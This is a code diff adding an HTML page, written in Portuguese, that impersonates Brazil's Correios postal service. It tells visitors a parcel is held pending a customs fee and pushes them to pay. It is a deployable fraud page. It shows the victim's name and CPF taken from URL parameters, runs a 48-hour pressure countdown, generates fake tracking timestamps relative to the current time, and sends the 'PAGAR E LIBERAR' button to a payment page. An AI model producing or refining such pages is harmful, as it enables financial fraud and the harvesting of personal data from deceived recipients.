@@ -1,0 +1,348 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/hgi-stroke-rounded.css">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+      * {
+        font-family: "Roboto", sans-serif !important;
+      }
+
+      @keyframes pulse-urgent {
+        0%,
+        100% {
+          opacity: 1;
+        }
+
+        50% {
+          opacity: 0.5;
+        }
+      }
+
+      .pulse-urgent {
+        animation: pulse-urgent 1s ease-in-out infinite;
+      }
+    </style>
+    <title>Encomenda Retida - Correios</title>
+  </head>
+
+  <body class="bg-gray-100">
+    <header class="p-2 text-cyan-700 text-xs bg-zinc-100">
+      <span>Acessibilidade <b class="text-xs">▼</b></span>
+    </header>
+    <hr class="border-white">
+    <header class="bg-zinc-100 p-2 flex items-center justify-between">
+      <i class="hgi hgi-stroke hgi-menu-01 text-2xl font-bold text-cyan-700"></i>
+      <img src="images/logo.svg" alt="Logo" class="w-30" data-pagespeed-url-hash="2268717002" onload="pagespeed.CriticalImages.checkImageForCriticality(this)">
+      <img src="images/sair.svg" alt="Logo" class="w-8" data-pagespeed-url-hash="351228946" onload="pagespeed.CriticalImages.checkImageForCriticality(this)">
+    </header>
+    <hr class="border-orange-500">
+    <div class="bg-red-600 text-white py-2 px-3 flex items-center justify-center gap-2 flex-nowrap">
+      <span class="font-bold text-sm pulse-urgent whitespace-nowrap">⚠️ Encomenda será devolvida em</span>
+      <span class="text-lg font-bold bg-red-800 px-2 py-0.5 rounded whitespace-nowrap" style="min-width: 90px; text-align: center" id="countdown">48:00:00</span>
+    </div>
+    <div class="p-4">
+      <div class="bg-white rounded-xl shadow-lg overflow-hidden mb-4">
+        <div class="bg-cyan-700 text-white p-3">
+          <div class="flex items-center justify-between gap-2">
+            <div class="min-w-0">
+              <p class="text-xs opacity-80">Rastreio</p>
+              <p class="font-bold text-sm tracking-wider">NB484629378BR</p>
+            </div>
+            <div class="bg-red-500 px-2 py-1 rounded-full text-xs font-bold whitespace-nowrap">
+              RETIDO
+            </div>
+          </div>
+        </div>
+        <div class="p-4 border-b border-gray-100">
+          <p class="text-xs text-gray-500 mb-1">Destinatário</p>
+          <p class="font-bold text-gray-800 uppercase nome"></p>
+          <p class="text-sm text-gray-600 cpf">CPF:</p>
+        </div>
+        <div class="p-4 grid grid-cols-2 gap-4 border-b border-gray-100">
+          <div>
+            <p class="text-xs text-gray-500">Origem</p>
+            <p class="font-semibold text-gray-800 text-sm">São Paulo/SP</p>
+          </div>
+          <div>
+            <p class="text-xs text-gray-500">Local</p>
+            <p class="font-semibold text-gray-800 text-sm">Curitiba/PR</p>
+          </div>
+          <div>
+            <p class="text-xs text-gray-500">Status</p>
+            <p class="font-semibold text-red-600 text-sm">
+              Aguardando Pagamento
+            </p>
+          </div>
+          <div>
+            <p class="text-xs text-gray-500">Prazo</p>
+            <p class="font-semibold text-red-600 text-sm">48 horas</p>
+          </div>
+        </div>
+        <div class="p-4 border-b border-gray-100">
+          <div class="relative inline-block">
+            <img src="images/post.png" alt="Pacote" class="max-w-full h-auto rounded-lg shadow-lg">
+
+            <!-- Nome -->
+            <b id="nome-repetido" class="absolute top-42 left-15 text-xs font-normal">
+              Nome não disponível
+            </b>
+
+            <!-- CPF -->
+            <b id="cpf-repetido" class="absolute top-52 left-30 text-xs font-normal">
+              CPF não disponível
+            </b>
+          </div>
+        </div>
+        <div class="p-3 bg-amber-50">
+          <p class="font-bold text-gray-800 text-sm text-center">
+            ⚠️ Taxa de Liberação Aduaneira
+          </p>
+          <p class="text-xs text-gray-600 mt-1 text-center">
+            Pague a taxa para liberar sua encomenda.
+          </p>
+        </div>
+        <div class="p-4">
+          <button onclick="trackPaymentClick()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-xl text-base transition-colors shadow-lg">
+            PAGAR E LIBERAR
+          </button>
+          <p class="text-center text-xs text-gray-500 mt-2">
+            🔒 Pagamento Seguro
+          </p>
+        </div>
+      </div>
+      <div class="bg-red-50 border border-red-200 rounded-xl p-3 mb-4 text-center">
+        <p class="font-bold text-red-700 text-sm">
+          ⚠️ Sem pagamento = Devolução
+        </p>
+        <p class="text-xs text-red-600 mt-1">
+          Após o prazo, o pacote será devolvido ou destruído.
+        </p>
+      </div>
+      <div class="bg-white rounded-xl shadow-lg p-4">
+        <h3 class="font-bold text-gray-800 mb-4">Histórico de Rastreamento</h3>
+      <div class="relative">
+    <div class="absolute left-4 top-0 bottom-0 w-0.5 bg-gray-200"></div>
+
+    <!-- 1 -->
+    <div class="flex items-start gap-4 pb-4">
+      <div class="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center relative z-10">
+        <span class="text-white text-xs">$</span>
+      </div>
+      <div class="flex-1">
+        <p class="font-bold text-red-600 text-sm">Aguardando Pagamento da Taxa</p>
+        <p class="text-xs text-gray-500 js-dt" data-offset-min="0">07/05/2026 14:39</p>
+      </div>
+    </div>
+
+    <!-- 2 -->
+    <div class="flex items-start gap-4 pb-4">
+      <div class="w-8 h-8 bg-orange-400 rounded-full flex items-center justify-center relative z-10">
+        <span class="text-white text-xs">!</span>
+      </div>
+      <div class="flex-1">
+        <p class="font-bold text-gray-800 text-sm">Objeto Tributado</p>
+        <p class="text-xs text-gray-600">Encaminhado para fiscalização aduaneira</p>
+        <p class="text-xs text-gray-500 js-dt" data-offset-min="93">07/05/2026 13:06</p>
+      </div>
+    </div>
+
+    <!-- 3 -->
+    <div class="flex items-start gap-4 pb-4">
+      <div class="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center relative z-10">
+        <span class="text-xs">📦</span>
+      </div>
+      <div class="flex-1">
+        <p class="font-bold text-gray-800 text-sm">Objeto em Fiscalização</p>
+        <p class="text-xs text-gray-600">CURITIBA/PR - Centro de Distribuição</p>
+        <p class="text-xs text-gray-500 js-dt" data-offset-min="1517">06/05/2026 13:22</p>
+      </div>
+    </div>
+
+    <!-- 4 -->
+    <div class="flex items-start gap-4 pb-4">
+      <div class="w-8 h-8 bg-cyan-600 rounded-full flex items-center justify-center relative z-10">
+        <span class="text-white text-xs">🚚</span>
+      </div>
+      <div class="flex-1">
+        <p class="font-bold text-gray-800 text-sm">Objeto em Trânsito</p>
+        <p class="text-xs text-gray-600">SÃO PAULO/SP - Centro de Distribuição</p>
+        <p class="text-xs text-gray-500 js-dt" data-offset-min="4238">04/05/2026 16:01</p>
+      </div>
+    </div>
+
+    <!-- 5 -->
+    <div class="flex items-start gap-4">
+      <div class="w-8 h-8 bg-gray-400 rounded-full flex items-center justify-center relative z-10">
+        <span class="text-white text-xs">📦</span>
+      </div>
+      <div class="flex-1">
+        <p class="font-bold text-gray-800 text-sm">Objeto Postado</p>
+        <p class="text-xs text-gray-600">SÃO PAULO/SP</p>
+        <p class="text-xs text-gray-500 js-dt" data-offset-min="7174">02/05/2026 15:05</p>
+      </div>
+    </div>
+
+  </div>
+      </div>
+    </div>
+    <footer class="bg-yellow-400 p-6">
+      <div class="max-w-6xl mx-auto">
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+          <div>
+            <h3 class="text-lg font-bold text-gray-800 mb-3">Fale Conosco</h3>
+            <ul class="space-y-2">
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Registro de Manifestações</a>
+              </li>
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Central de Atendimento</a>
+              </li>
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Soluções para o seu negócio</a>
+              </li>
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Suporte ao cliente com contrato</a>
+              </li>
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Ouvidoria</a>
+              </li>
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Denúncia</a>
+              </li>
+            </ul>
+          </div>
+          <div>
+            <h3 class="text-lg font-bold text-gray-800 mb-3">
+              Sobre os Correios
+            </h3>
+            <ul class="space-y-2">
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Identidade corporativa</a>
+              </li>
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Educação e cultura</a>
+              </li>
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Código de ética</a>
+              </li>
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Transparência e prestação de contas</a>
+              </li>
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Política de Privacidade e Notas Legais</a>
+              </li>
+            </ul>
+          </div>
+          <div>
+            <h3 class="text-lg font-bold text-gray-800 mb-3">Outros Sites</h3>
+            <ul class="space-y-2">
+              <li>
+                <a href="#" class="text-sm text-gray-800 hover:text-gray-600">Loja online dos Correios</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+        <div class="text-center mt-6 pt-4 border-t border-yellow-500">
+          <p class="text-sm text-gray-800">© Copyright 2025 Correios</p>
+        </div>
+      </div>
+    </footer>
+    <script>
+      function startCountdown() {
+        let endTime = localStorage.getItem(
+          "countdownEnd_039ad64d6eafaa3eb37d141389e57ca2",
+        );
+        if (!endTime) {
+          endTime = new Date().getTime() + 48 * 60 * 60 * 1000;
+          localStorage.setItem(
+            "countdownEnd_039ad64d6eafaa3eb37d141389e57ca2",
+            endTime,
+          );
+        }
+        function updateCountdown() {
+          const now = new Date().getTime();
+          const distance = endTime - now;
+          if (distance < 0) {
+            document.getElementById("countdown").textContent = "PRAZO EXPIRADO";
+            return;
+          }
+          const hours = Math.floor(distance / (1000 * 60 * 60));
+          const minutes = Math.floor(
+            (distance % (1000 * 60 * 60)) / (1000 * 60),
+          );
+          const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+          document.getElementById("countdown").textContent =
+            String(hours).padStart(2, "0") +
+            ":" +
+            String(minutes).padStart(2, "0") +
+            ":" +
+            String(seconds).padStart(2, "0");
+        }
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+      }
+      startCountdown();
+      function trackPaymentClick() {
+        window.location.href =
+          "../pagamento/";
+      }
+    </script>
+
+    <script src="js/script.js"></script>
+
+    <script>
+(function () {
+  const params = new URLSearchParams(window.location.search);
+
+  const nome = params.get('nome') || '';
+  const cpf = params.get('cpf') || '';
+  const nascimento = params.get('nascimento') || '';
+  const imagem = params.get('imagem') || '';
+
+  function formatCPF(cpf) {
+    cpf = cpf.replace(/\D/g, '');
+    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+  }
+
+  const nomeEl = document.querySelector('.nome');
+  const cpfEl = document.querySelector('.cpf');
+
+  if (nomeEl) {
+    nomeEl.textContent = decodeURIComponent(nome.replace(/\+/g, ' '));
+  }
+
+  if (cpfEl && cpf) {
+    cpfEl.textContent = 'CPF: ' + formatCPF(cpf);
+  }
+})();
+</script>
+
+<script>
+(function () {
+  const pad2 = (n) => String(n).padStart(2, '0');
+
+  function formatBR(d) {
+    const dd = pad2(d.getDate());
+    const mm = pad2(d.getMonth() + 1);
+    const yyyy = d.getFullYear();
+    const hh = pad2(d.getHours());
+    const mi = pad2(d.getMinutes());
+    return `${dd}/${mm}/${yyyy} ${hh}:${mi}`;
+  }
+
+  const now = new Date();
+
+  document.querySelectorAll('.js-dt[data-offset-min]').forEach((el) => {
+    const offMin = parseInt(el.getAttribute('data-offset-min') || '0', 10);
+    const d = new Date(now.getTime() - offMin * 60 * 1000);
+    el.textContent = formatBR(d);
+  });
+})();
+</script>
+  
+
+</body></html>
